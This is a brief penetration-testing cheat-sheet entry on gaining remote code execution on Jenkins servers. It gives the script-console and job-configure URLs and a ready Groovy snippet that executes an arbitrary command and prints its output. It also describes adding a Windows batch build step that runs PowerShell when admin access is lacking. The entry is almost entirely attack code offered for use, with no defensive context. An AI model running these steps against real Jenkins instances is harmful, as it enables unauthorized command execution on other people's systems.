# RCE < 2.x

With Admin access

```
http://jenkins:[8080]/script
http://jenkins:[8080]/job/<project>/configure
```

In the script console, Groovy script could be

```java
def sout = new StringBuffer(), serr = new StringBuffer()
def proc = '[COMMAND]'.execute()
proc.consumeProcessOutput(sout, serr)
proc.waitForOrKill(1000)
println "out> $sout err> $serr"
```

If don't have Admin access but could add/edit build steps in the build configuration.
Add **"Execute Windows Batch Command"**

```powershell
powershell -c <command>
```
